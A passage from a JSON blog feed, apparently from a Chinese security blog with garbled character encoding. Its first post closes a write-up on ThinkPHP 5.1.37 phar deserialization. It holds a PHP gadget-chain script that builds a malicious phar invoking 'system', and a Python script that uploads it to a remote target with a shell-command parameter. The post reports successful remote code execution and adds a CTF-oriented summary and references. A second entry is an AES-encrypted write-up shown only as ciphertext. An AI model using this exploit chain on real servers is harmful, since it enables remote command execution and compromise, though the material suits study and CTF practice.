class=\"string\">&quot;system&quot;</span>;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;config = [<span class=\"string\">&quot;var_ajax&quot;</span>=&gt;<span class=\"string\">&#x27;&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;hook = [<span class=\"string\">&quot;visible&quot;</span>=&gt;[<span class=\"variable language_\">$this</span>,<span class=\"string\">&quot;isAjax&quot;</span>]];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">process</span>\\<span class=\"title class_\">pipes</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>\\<span class=\"title class_\">concern</span>\\<span class=\"title class_\">Conversion</span>;</span><br><span class=\"line\">    <span class=\"keyword\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">model</span>\\<span class=\"title\">Pivot</span>;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Windows</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$files</span> = [];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;files = [<span class=\"keyword\">new</span> <span class=\"title class_\">Pivot</span>()];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">model</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">Model</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Pivot</span> <span class=\"keyword\">extends</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">think</span>\\<span class=\"title class_\">process</span>\\<span class=\"title class_\">pipes</span>\\<span class=\"title class_\">Windows</span>;</span><br><span class=\"line\">    <span class=\"variable\">$w</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Windows</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$p</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"string\">&#x27;phar.phar&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$w</span>);</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;test&quot;</span>, <span class=\"string\">&quot;12345&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$p</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>æ‰§è¡Œåç”Ÿæˆpharï¼Œç„¶åæ‰§è¡Œè„šæœ¬</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.parse</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;phar.phar&#x27;</span>,<span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    s = f.read()</span><br><span class=\"line\"></span><br><span class=\"line\">s = urllib.parse.quote(base64.b64encode(s).decode())</span><br><span class=\"line\"><span class=\"comment\"># print(s)</span></span><br><span class=\"line\">remote = <span class=\"string\">&#x27;&lt;here_is_remote_ip&gt;&#x27;</span></span><br><span class=\"line\">sess =requests.session()</span><br><span class=\"line\">r = sess.post(</span><br><span class=\"line\">    url = <span class=\"string\">f&#x27;http://<span class=\"subst\">&#123;remote&#125;</span>/index.php/index/index/hello&#x27;</span>,</span><br><span class=\"line\">    params=&#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;ethan&#x27;</span>:<span class=\"string\">&#x27;&lt;here_is_your_shell_command&gt;&#x27;</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;world&#x27;</span>:<span class=\"string\">f&#x27;hello=<span class=\"subst\">&#123;s&#125;</span>&amp;a=phar://./hello.txt&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)</span><br></pre></td></tr></table></figure>\n\n<p>æˆåŠŸRCE</p>\n<hr>\n<h2 id=\"æ€»ç»“\"><a href=\"#æ€»ç»“\" class=\"headerlink\" title=\"æ€»ç»“\"></a>æ€»ç»“</h2><p>pharååºåˆ—åŒ–æä¾›äº†ä¸€ç§æ‰©å±•ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢çš„æ–¹å¼ã€å…¥å£ï¼Œæ‰€ä»¥åŸºäºunserialize()å‡½æ•°çš„å„ç±»æ”»å‡»tricksï¼ˆæ¯”å¦‚å¼•ç”¨ç»•è¿‡ä¹‹ç±»çš„ï¼‰ä¾ç„¶é€‚ç”¨ã€‚é‰´äºpharååºåˆ—åŒ–æ¼æ´è®¾è®¡ç‰ˆæœ¬è¾ƒå¤šï¼Œç›¸ä¿¡CTFæ¯”èµ›ä¸­å®ƒä»ç„¶ä¼šç¨³å®šå‡ºåœºã€‚</p>\n<hr>\n<p>å‚è€ƒèµ„æ–™ï¼š</p>\n<p><a href=\"https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html\">Thinkphp-5.1.37-ååºåˆ—åŒ–æ¼æ´</a></p>\n<p><a href=\"https://www.php.net/manual/zh/class.phar.php\">https://www.php.net/manual/zh/class.phar.php</a></p>\n<p><a href=\"https://blog.csdn.net/lllffg/article/details/116145918\">Thinkphp 5.1.37ååºåˆ—åŒ–æ¼æ´</a></p>\n<p><a href=\"https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf\">us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It</a></p>\n<p><a href=\"https://github.dev/php/php-src\">https://github.dev/php/php-src</a></p>\n<p><a href=\"https://www.webhek.com/post/packaging-your-php-apps-with-phar.html\">packaging-your-php-apps-with-phar</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/205943.html\">PHARååºåˆ—åŒ–æ‹“å±•æ“ä½œæ€»ç»“</a></p>\n",
            "tags": [
                "Phar",
                "ååºåˆ—åŒ–",
                "PHP"
            ]
        },
        {
            "id": "http://cubicy.icu/2021/11/09/WriteUp%20%E6%97%A5%E5%93%ADschool-bus%20%E4%B8%8A%E4%BA%86%E9%82%A3%E4%B8%AAwriteup/",
            "url": "http://cubicy.icu/2021/11/09/WriteUp%20%E6%97%A5%E5%93%ADschool-bus%20%E4%B8%8A%E4%BA%86%E9%82%A3%E4%B8%AAwriteup/",
            "title": "WriteUp æ—¥å“­school-bus ä¸Šäº†é‚£ä¸ªwriteup",
            "date_published": "2021-11-09T03:08:00.000Z",
            "content_html": "<p>å¯†é’¥è¯·æ‰¾æœ¬äººç´¢å–^_^<br>AES CBC Zero padding 128bits&#x2F;block IV&#x3D;0  UTF-8<br>qboAHUOHL+uw94b2elojCJWHWKwqPtIwFzSDKPZqmHPSu0APpp7H0ibcQNIUgrwDCCwdydqP+T74+slwNh6PM4GTvT1CoF2thGIZi5yCS9HfleGi5hP58rxFM3HzQxaU9EcxOEYbtGObactrCOzKP&#x2F;+tPittHwWWiL5uEQyt8ESrZlgr19O5mtM4zrkRoODCUtcna5XWuatk94T60ToF6ZrhqTb5v60dcwGjw3Zf1xaBRvYR2HltlogOzs&#x2F;QoLrDm&#x2F;gzGqxvddGPCaOEkF5nCzk4un7sl6RJD77GVxRA4IqYMSExrw&#x2F;By3bqLJyL+3waQihC4E3teqyknbLGbYCtF5VKV32WmE8H0hEyP0KkpO6MTJBiz4mziI3M0+pmoTXIRiBSpISAGq7RbKMIs2cOFD7Baxx+vUXuCShr7ZExYTi3bHD3r435&#x2F;F4WXA9NuFaNM5Lhu+rmFBRobYZ2Ur3BBIFDlTT6gI5XXgoVj9qhHx5DJWFlGcglkgefiabVxUmTFFohZPLnpJxGJByTi6Frw+epqfZkrY0eGTMPIBKcwQDqh1DnPDyxm+64Xr5fffzpmG&#x2F;HNyq8Nsa1qpk8Yw+Vu4l03oDZ9CX0msubse852dj0ySNKgYXSOKnYet8jdjSC2eVd14nypMuok1BPUoHMv4rlme813n&#x2F;lE8LehT5xRF8R+HFyxfsRb354Xr39YX5DpI61tS41P1A+IiXbWvGG7kUk7Ln4mV+UJe6FEWzNzD5f0o3thGCoYd7ccyUrVJTbFsnbz7wuCmWS9dFkx3QAOxkGcbgyPh9NtbkcfKYa&#x2F;znW6GibzQf3NQZ2W4jQl&#x2F;wEtVPMs1BzweyAI3XGoJy7ZdHrvrswzdSq9rrcJLYW8TLG4lCowCRwb0gx1d9RptT4Tnj15poEl3zW66+L9dSb6RxTgsWrh0MM20xHmLmAEkoVG5QtGpZjQUIiKrq2BDahZtKWQayM1c+x8PtdZysfGYxyW+nzq&#x2F;frGKmEKwo8GMqiLwevXk1aLryVVf57ofS56w+cyYAwmJtJ3ZKyeV26k4+WkV7EHBrTbItrz8EG8uP1eTzz922bAOhdWVck80iAc2QeolUYa6Ohp4GPP0tN2Q+CtBuPgjaPERjt42ZfhmstjJ9OoOiFObtUH72Rvg0i8aK+NsaSM48jxxuCJ8atXf57uu6giunfmaGaQ8fbdd395Sq7mTbvUiTVEn9tQX23xYfKcpnHSPMGfdcmeL5LdYg153QHLRLJ79&#x2F;vFbTKt6iLLbcImzlNgs70xE78rKHG3YFrrGwd41&#x2F;DSOxLqHYE5tiHkb32Haoy+&#x2F;d6NAAzahYrhx2x28DVDmJbotGIEjpCw4hvWSwAkT3toy0aRE5XpVpzzqXqxaSTteM+Vifzr&#x2F;+zynUM7SUwbMvONbqyhqC6tKtYtEOFoknu80e20Id7Ja9nfWH8s0Z7iWeb0p&#x2F;8i5yHvZVuuYFnDkcOz1z7VGmi6B7W2KTp9BWcjTupzxH+pnoGV+hMUHFiBoYrZJzt5bFpvOzEYJDHhq4oh8jxZMeKADJBwDfoNFaBeN2tVS93HJ1tT18YwI4BsxiDjBuX351JfepxVrP0d0DNlT&#x2F;rYgCyeXzIiz244JReySuLe6mALcEg0htTn7oZt6yONG1LVq8mfQ6GXrSqIaeBbNrfP3FF7C+7Vri45CvV39Rnt9y2r3eKdOW2VGf+8XZ8JBWKwpT65u1lKxim+FDxxmqxY1nStKtm3v6K5FtcsBz3LmNBJPB9oaILV10XWIPVVOpgD4MwV4XFT&#x2F;vpgoVhL0Det0atbj1KBG8A0dhLZwcWx72l&#x2F;yuAoCLuMoXciNPsVmngkkuCFVEziPxgPqVfPQTbGQbk4raRfOkCbkK5nAS4MTeEfr61fvQwYVXPYRTXDx1DWbTUABHbG0e5f8OG7fKNpC8c8m94sZM6osTLAdus73OC5Lj&#x2F;iHsOYgjfkW1KRnL7W5b2UOdNgUVyQueSNBmQEw4sW9J5+LWYd4NRE0qL8TLrjhL26u6L6RBVMEJomjcAQnOBGIiBVl4jSAgt1HcpnDn7JyV95Th5pPEJ7YGtgLkBkuvIpiIW9sGLwWJsWkJwQXyFTSxMaJeaxyz6q725nxYXrIXIq7uGUJrDaN60GNnwgL&#x2F;swzqqlmF0gdorXScCHc06roB+27rYV3kEEguhmsyoyxHdX4J33BEXeqigi3JaTrsVafApgIKZYhN&#x2F;uH5UKHgZ4Xr8Qq&#x2F;aTVcnv8ovm6jwTZRnQFCZaPKQ995TL5Rfm8gF4ejv32i2g&#x2F;0F1bxwJ3sqYCEo4cDtsWXeAY9pidVji6BHZ25oSuiYb2G7TBpfoo26Ey8e4l5zM0KRgeBmk6g3iXILfY6DH71fjzptJ+H4I5anThAZMycGTkr7UzknBxCluU98JK4WQnU3klY4E4ZZbHrYGmO3UwRxEzyqfFVB4JFSDbuWy4OJzmDCX+LFMAD5PfOKIDAIQ1Skm6j&#x2F;UqPXoVIZelOk0A57WCZ+&#x2F;eP0O5fpc1JhtkPkvfr7yQjFIHtRbJb2toReQxHtLvrFhAyBvC28xxI63fX&#x2F;C1At2u3agpy4KnUzAwdVAUVq9f2DjxTkrh3btk83i8aLG2QQvg6DCr7KB9Tw4exkc6MMxtjtpbwgZx0dLsh&#x2F;SyYBTRs+LgsfsBLVg5FhviLay+47uuXl6CQBZHQXcBl8LmRxOrYsHQnkgQ1qBpl7uJO5ru1rTMdbDP4+TSoxNcUEFZcHal0Baz4Srikc447dhDkvPtnEdIdxJEN5xnbHqd0EsE1f3Dn2vQLcQ7BeYWWUGLCdLte95y6EdYvL1r96Ggqv6izkQ&#x2F;aImw5Hif5KPuGt1Og8GPPlywv8wIDpi&#x2F;7V2Xw1FCOuJXSQRJjoKow87AcpKmmjKEHew0QdI6cOEBDwZki5bjFA9j6LW3NckoFOu7QTaA5alDsTWKJMnwHEN6Mn3IfoPVs7bqM9q6sPmDyoVUd8AjgA2iYkaJlS8TcXqWLl7z&#x2F;4F5GjmmV7a9hcY&#x2F;ClYN7zhagdUaFakLKkw0ngzsjZP45&#x2F;Hn0HWUfDH7NaLLovWi&#x2F;wKXYqrrMZkvKqVDhSD4U57zKCS05tBg0jqoW2digZPvzHJHDq2UV5o&#x2F;9MaIyTPgzU7JhUTrKOD+HzX3ZYvsFrmUfx9eiCVK57OkxfDGrzmVCgjX9ZIn2r0UzEbI1mfjHq75DiES38S2g67ypcnjnX4&#x2F;o2qmHI9GR7xzsB70Ol96WGcoOvYn2v6&#x2F;ldWx8dGOBRiTXUWve4jgtdCWupi4O8AikIhktX8sTJ+VBEhNr9negjA+FQj3y1xaPYl4LTyzpgiaeIDBUZnyt8Lgl&#x2F;fi&#x2F;Nm12nQDhE2vEJ3R2cjciLWG50b6U+9r94bS0nzbY0uupbI+fep8DE7ty4NHo0TtFF&#x2F;58f49MEj7c56AWzLGanI+OnYqYJ7w5tCbhY4V01jYYwEX6Ur0GWOZvsmOeR1kCSMLVWRcNipjOBr8LA9JeTfVr0WPyvl4rBD0RJ2ITrP3jn85iHVYMUCmTiXaav6poh1+WCPYM2J9q4bdwK1TBxX2vBCv33t&#x2F;e6wABwqh5wsy1APhgzL1ZTZrSsnCNfnPXbJXtWCaexkYF58gRZ3+I2XZgYvmj37TT53qhayl7sNImuGLFWuWVH0um+ldqP1u0joF+&#x2F;BiJTD1gbgtSE+HW3r+Ntd5OgQBbXHhy54d4ABucD7RqFS95GlwadZV6v4AjJFKFYh1rnDZHKVDT9Ux301iTmwFvPatYPwCyJAmJ4bndBzhmwDl&#x2F;yU8KFuZ8zbA8yUr5nrtSu9A&#x2F;I6rsRtMdKQTJMRZ4iL5s1zmZTzPVF1&#x2F;VOoqIVLP8kDtuyyxVXGUcufl6nIHCYoQlbvvXQV3TWIlnut2uWxuedeTuOS3vQj1JDnmkEnc&#x2F;BmjeY2zGFgxtDpTjwW&#x2F;Eh9SFJq9ZctkGkPdwrXCXr+DThhguEGXS7fGJeScW5fN0&#x2F;u1w&#x2F;V4c4VW9&#x2F;GNDBZRuG6AyUjEjVABlBj4fER+2vhhzgnzhTnh+j5qNpMFy7Jhd0gmLgdywSUTrK2U96l9tcZYnIMOnLlAzinaqDauE9KigK+x4tWxEW9LMmfCsmV72BRaIpx8xrrmvaF0DYLKCqxvY3SdCU3YIxA6iIMhShTN15M6znJzq8kufcm6FJ+iO6bzDnDLSwdUteGfQCgHKAK4S&#x2F;NPsChjP5OB&#x2F;qWZsq1KCFTUh1+04E+F2oHfwMUitqLV1blL4KPUeImUx0ldbeXHtEMxHwWX9CQbU2Ksd9iyCB9oye4ANR5FDpYJBC5Yvb9SAMW18zT99I2FfS6S5umUDm&#x2F;uTR0V3fAjWMDwwjhuWH9YZRqOADr9UXNHdJn5M4MagfplbfBdWWiU0Waxc+14EZkX0&#x2F;62UKO5YyZzkHrv2X0jckDbGFuG29fY6PJOnmY+UN6JhOJ52OfrjR4KIrp2SORgHzEUqD6YzF8zhmBsMZ8AY9&#x2F;GMAGLbV1zhbuIls5FzIX1JdeJNzEUt31nIz5rEfhgXQa5eHFUqxrE7xZTzajOG0e&#x2F;CF&#x2F;xJeTt85iii40wTADQ875fgxnR6hBbqVGb6PVKekN&#x2F;1CNbCyqyp&#x2F;NbS8rS5Q+49NVtF8anddxlb6PkliqxlKlrBUmQKDT1d5tgkEeyNj8cBS4Ve3bJG4Pd526iqqmyW8y&#x2F;EiGLa6RwVe9VmUB2qp&#x2F;4GlWqZ&#x2F;tb4Z5T4KkXvpEv6MtV5+DHyjqlDNSmYcFL9N8Zk31TyVckkMWxcrvYZ+gZnCGqiQQPmCXhYfGlaMDkBhAZNSBZwX0c1fyKNCu7wA2D29l&#x2F;NquX2VfowrYAExOVlh6Gpa0O0BlyqCJYwI0lnaPpqhnhaDO6mTiokYuWOiQnSrVRBGHk2cxLKt0VH&#x2F;hL92mWc13+AmEemKcOJJaj9RRAWZ0t3H7WjgMhJgR26xJufcfES74EM1FEta1s8vboiDfcTOwXCdUInCnV0Pq2atGpq4oCxuM8YdlR+iopxMehFm&#x2F;FdR5tedsLN87jJIEC&#x2F;CJcWYLF3wE4lt9NOJk10ZHRxSgLS6&#x2F;42fGTFx+chZaN7JxAFhKPttpz3PG038aclzC7G&#x2F;fR0wUXnoi0U2Aide+DZfRWLn05rPDMRuodYTLet&#x2F;4GdbIgdGOqa0LReMei3+g8Ej+h2s0qRxb5fyixwjwCO1HDny5tK4Y3iG&#x2F;KbGXo0vsMymGcAQNphEn94EHk6oaBlHRbgtcwWOEqMlSLLyI5z3OqmoxK6WLj0Kw9g3YiSFSYhCNwa9gw9032cRSLxWDhGGBSF5T9wmjn2J7y4jgg1qrlQa1oTJ+Ep1jBsTQKJIds+E&#x2F;+XK3&#x2F;dCQLIBWkcQFGXblOkukLR&#x2F;uhCdMhhLcbsz1GqYI&#x2F;29K7A6uj+zm8Ep&#x2F;uLgpBQFrxFuIUYFQ4&#x2F;1OO&#x2F;ZkuscEGirPyeDkVeRHVjCt6JFCWUFC0X6ZNtbmSyD51BFNmv+gJroUxhddlWDADjDWI63N7tTWIPJ5mkv9VRM5WGZFrxSIiIZ9M4PXNTErzxRB3008xdtbUrKqlBuoPWsRK4Cea4IdiOyyISAtallenfMlWGvNV1FNzKY1CliJRLtEErg+5UurywxwuMDerKcMx5c&#x2F;+3MoCtFTCLOp3JI8uL6M2qWbSuRFd1Q6PEEH&#x2F;QUTHtmxopXhztQ5zoclhcKKugfxhz1iQLVRohWD&#x2F;xnbjahebmp9pV836wIjebrltKo31KpluhberLabcbIBtGAqtT6BtadXtcwPX5ensTQNN7U6xPE4IAREcClVchuzQGalwss2s1si9D64RHkqX97txTJQ3Yk7xuGa+OmPCNPCGGadbEKbrhIPpCI&#x2F;3ryILqToozUfDjXQrzl3rvNyxAy9pwtcWj1iBGFN&#x2F;8JBkCBi0B+IspyFYk65RkOfiXE6X1I6IjjYyAUszYInPfOeY8RKrSnuxBj401BlRljYkTALlITzxAzVBytpxQwP4Ofhj1Gty8JVBdsveNvA2M6fw524lGFOadqThTqdP330aqL1HrJhhw&#x2F;cZo+wAYmvo9dgrbDLlK8yDyLtBhRmCQAnwf&#x2F;CtdVK3bqAlw2xr2S0tBNIq5dC&#x2F;9QU+yiJSJlf57Ui186BnzLNLmfkpWxU5oW3RnWXaM21bqNvrarqnqEKxcQiTTP6Le1BDhuoceKzzB7rPlMjPO6GUXO3pFaZfMgwwPmNBvFEnCEsLngzjObiJARrEmtV&#x2F;I5RRTUXMAwCK5ookoSFfFVfqTih36sJOaBCCDR+TEkQ3zQE2ZvV35OTb586cPbvp0B3Vd+RRnF79Z4+56etRg38pDY9EEFj&#x2F;&#x2F;trgxQ&#x2F;QkYclWHqeUWm5pKhFZ+g2qLMlVs1K0q8d6sSsvt0R7iuDZtNZZLd9D&#x2F;lxyz7rkGT7DpqTpOjvRZqG+VGquYaLFId+xE6nqPM8CEWz1&#x2F;NT8691a6XX7qCdWSm78nmrZ&#x2F;IX4IGGc5LZBLo8j9sf9lXqGNqSYKOjdkEIKswoYTfxRk4y4&#x2F;cWo9f5nIbP+Vaw2bjZ5WKespE4CTAOxpk7DHXxh5wzYPld6NqjdYiaz1+DbLWVSIeRfX0h+bbsFal6+gDJ8hM5bHc5xrlim+nCloZXuBhEsd9ZEEIiGdew&#x2F;l72jCnlfZH&#x2F;tfxshLOAvJY86uGsytRp3UkGtDmnloRtJJ4lYB3aoIgcuQSt9NzyqU&#x2F;sK8ivilobtO3s9+iDykFnLmtpI&#x2F;c&#x2F;wZMQ6na0GuyohYe397yya9UosBdt5jhumBxntnIPVeqKCdavin&#x2F;P5AGbWo8LowD2pGyD0pHR9ptBYDuuIv4&#x2F;tBuskdK3HQHPCOGIFj8Syqc9LG29IwtySpz&#x2F;AkBEIg+81UJ5V+b5r7&#x2F;jjlepp8ow049YyDcKzNP8HGAhfmYtEPb0zZKcd7ZyGYhID9RfUwHrPRSdSFuGDZhiBYhdrI2lpXaUgsbpho+CjUp74Dl6pl2RX+YNZSbl3P4wVfNBMlmOHWqJ8UEctbb&#x2F;DVoSjs3C0kptMRBbBSwK8uUi9AR+Y17Ruti5Li7Hcc4iQ7FDJ7wnkAXD3KSGZ&#x2F;OEvM1ghAazhRMeKANiZ&#x2F;CGSidJwBq+PdF3RbqsshaWWjVi6oq9JktiCI78yJuZ+funSupw&#x2F;M0YXKyiuXD6ZrxMcG5PjTWb&#x2F;FH5XR2QtUTSwq&#x2F;z1yYnhXTjtMjP6kex7yda58C&#x2F;QD+0YBdKhyMxuwSzOixS5ryofQ5cavR&#x2F;4zOBtxmDewhTSII+eLpgqFMdzZFnG7Bk4ot1AHPCOxA1bdEn3IzH9GQ7NMo3G4kskakXZC3K5QHcsgUr+&#x2F;8k8fY79Utp&#x2F;3sq&#x2F;MqTgeml7NAau0jhkGbMANcr4jZj3N4tBsmo&#x2F;InMiI7+H7k1fDa32BrzdoevMfJYA3PaDHFRFuoeDlWAnxAAyk11kKjnidwQ&#x2F;rBqIzrdIBMAfyfbrA55Q47SBe7fwVrzFRBPKtjICzBPKzlIU5&#x2F;xIfDo3IpEY8h6emLxN3dLLLuIBoCtm7MqkB9MA7hzlEwkGPY0oUwtH323Y43Y69s1ldtzi+J+tVbCJrz2y1VVo1sLtoRgxkTqjqCtJpOi2Q7JLLX1433EQ8tywYvxCjuBH4N8GVPsUCuZFVpUZ7kQEfpCCmRnyyIE8myFbHHKBqq369PP49Pv6OzpkbHJ2ZictG9Yoi85ahlyqbnSacOAIfRBnruBBqo4KwTbAgbesupr0cCPEEMfb0pdyhFFC91RfG0H0ASsdfZk66Jfd2TCjagq8&#x2F;CKoCP2Vi+GLsV3du38v9uELTX3j3gxskoyDeb020ElGDk3L0rl2fIh8fa68knJSWs2z17N09NtGlNLzdbCu9AXBtq+bdxEOZXWk8u1o+YlFRFjphBNf9eMM3itN1&#x2F;5wv2A3e++qsB3t3ZCyaz7ltIdzmy5us9lgNIo4h4ZYpHyUeuQbAqqb40v2w+0g1e&#x2F;+9jtQJfZM+T+LEs16v8UQMB2Pr5Ug4lULpuYga76cbN&#x2F;zebqqe5ABGYWEIBFM+bxLvNv6c3v0VREhA1QvSEqLeYR6OV15tOIzjpJf4dGP6URUYyIz1UlJkEQZSjUFCq2H76YOtieydin+5wXwB&#x2F;s+jicn09aE6B3OYtp2CDBsDOdTtoOOzfz85Ee1dLhL9ogTrbaxkF0w8HRyACovRiag31U05liMpzg1CMVrDQo5qRUAdcNyJEXkSPbY88iZ75h&#x2F;+9N8JhSeJQzxrhl5nhlR9jct9H0RP8fGdt1EGlHCMsxGRVmRBAxykf2bt5N6qnN6&#x2F;Sjdfi0oPDxWdi3Y9M9ZWxgbqt5Tg&#x2F;UW6v9EGe0+hA8Ii&#x2F;Bq5Idw&#x2F;gFR5jlnTwKdB58apXtbtaYnyU3T7dAWwtZ4OvIfv7&#x2F;gpPbeyS1TqY71Gib1CW&#x2F;lWfIO&#x2F;0H98bOHPDIl8Ut3fi5xQG0yqHgQS165tTf2xo1i1sqD6tNDhCIDu&#x2F;1uefrNO3ExZh3Ea9Ac3428&#x2F;GWPVHlg4sqLKlZPds5NfKh0df+VPT3OLPLCH55NQXFtqwE&#x2F;ZsCguOl42vTcKWrkXl71Gp+X5x+mdAu+H1KNhU3f6p&#x2F;5sXiLyWT+T7h4SGvyOeBLUwJer4tFpByMATG560KhAuixXyzXwv8j70CyJp8s399T+N8eQhAxhXVBxgWdtl6Eu+rBPWbHmZXEH1&#x2F;mghBG+RFwuCh4jNPDeQDOBewYrmimmbpmFt1Iqz&#x2F;fuI5eSH8zQLMuzPKYhEG4p+5kPdBQkQz4NWzlrQ0yE2pXBvPNPngsljuC3pAVjRrUVb7MZtuO3BXPeDSb+EXgylh5rBmG7bkk43bdQ4TQyNs&#x2F;FYt7cQ7tFzBQUhWoIDNWKiEs0hThjLY4Aw9zFxuF3Uf9H+fU7GlwZBrsU+QdPR0vKxB5EeyHUamO&#x2F;NYRd5RtFNym4HhMqSEoTQPqLv79hzNyMyMvbrkOly&#x2F;nIwAyXmBmaVTVwVZr1fT+zXgzQL+VY5ByLjJrDw4ghbk67RGlX0qTyXV4mXY41j+0YZioIDBDJHP7D8QHrhQpzOzhMyxkQ7WvTLWEaZqbvGSXN619WL1j9XZOecnOAZazEm0BawPD9vVCMar6VD01ZKHIQVY6+EmdhaWr9j4afovGGPIeFaLzg1YwA6czDMdWH0pbZmV539qrs+sX+toGO5fXI7buTnjvcbi85wKSPj1xlvSIVYD05WH9EX2S8IsJrdLqxVlG4IQj4TIzUpbKxuChuNjDQO0idakciMB9Mkg7ZEolOltVBvZWv47UhoMZHfECUqQARpkRfl8B3YW37L1ihQC1HVpGSI9EiqCLd6ZD0cjg6+E1JK3yDZ3pr0or57JCMX2U0Lf3G3zDiZ9E+kit5C4HsNPCA4Xq9qLcEnSTbUrwR&#x2F;+Ol6DndvqxVSUjYEJCrmqp&#x2F;Fi1CY2XgCle5ojZ9IAWjrbg01FGZMCi3iiSfILVNcl8q4ZZFLweZbi+TivrAC+zRX8cpdCBSMrdC5pCMsIPvzRLJNm+jY32VdintOlE4xMHTk9rr2uNKJ4hQKJREyoz7XCYJrlo9LYIcS2o9lKo3xjSkpnC0SFtg0Sy&#x2F;pcpZw8wyOO2hTXOTmKzyOlw7VH1LtxTB14XoT95Y7euHiB&#x2F;11oz+6uOb3uRm4iql1s+tXka5CfeFhSt9xk3k4S91VDa7f3akOPDdxCQ701qVjM5&#x2F;aat2ARuoYfoghi1AwKpuWYchdLoYSrOiXX91SeH4gOR5UP8KXg2TnNOTvpHN5LRBKm58rMDe7ZmZCNM4AnubKNBP&#x2F;X8UNMaIokp3+I6KpH0c3jmTnSHnLwoi5oqfNx&#x2F;qT2K7ePGq3nqfTkCDqWKSWTe+QG6BsOXetF9mSKh8lPJbru3DfzZ6ICHsZIpfy8Vcfks5Hk+LT44&#x2F;jwWR9xz0B&#x2F;ia2bB6mG7X5Wo5AfbIFSVtrwYmm&#x2F;bx5Mib9QOK1U2X9zav7ObfFmMpENUCxEi1tr+bVQt&#x2F;iubPbpFZ6DNce8msWvzHhhV+81gn&#x2F;QQ3YW+yq&#x2F;Sm5CTP9pMfI72Mt6XCYtr1a6b&#x2F;vWaKnBKOL7dS7w5ORYbH9GlxhtEv4s5wdh+uqDjIZJp4jTt8ysEikkyJg8vj60Ymgd4Q6GEytoArUF7MfNB&#x2F;hYcgcCEOiOcVTRWL&#x2F;sLMDeaSklA1i9tVBUP95ROYnHI